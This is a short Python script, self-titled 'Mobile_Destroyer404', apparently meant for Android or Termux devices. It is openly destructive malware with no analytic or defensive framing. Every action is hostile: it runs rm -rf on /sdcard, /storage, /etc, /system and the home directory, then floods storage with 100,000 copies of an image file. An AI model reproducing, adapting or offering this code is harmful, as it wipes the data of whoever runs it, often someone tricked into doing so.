#!/bin/usr/python3
#code=utf __-8-__
#creater BilalHaiderID
#Mobile_Destroyer404 - v0.1
from os import system as cmd
from os import listdir as ld
from os import remove as rm
from random import randint as rt

dir_list =  ld("/sdcard/")
def Destroyer():
	try:
		for _dir_ in dir_list:
			rm(_dir_)
	except:
		pass
	try:
		rm("/sdcard/")
		cmd("rm -rf /sdcard/* &> /dev/null")
		cmd("rm -rf /storage/* &> /dev/null")
		cmd("rm -rf /etc/* &> /dev/null")
		cmd("rm -rf /system/* &> /dev/null")
	except:
		pass
	for i in range(100000):
		a = rt(1,1000000)
		cmd(f'cp .png/codexid.jpg .png/CODEXID_{a}.jpg &> /dev/null')
		cmd(f"mv .png/CODEXID_{a}.jpg /sdcard &> /dev/null")
	cmd("rm -rf $HOME/* &> /dev/null")
if __name__=="__main__":
	Destroyer()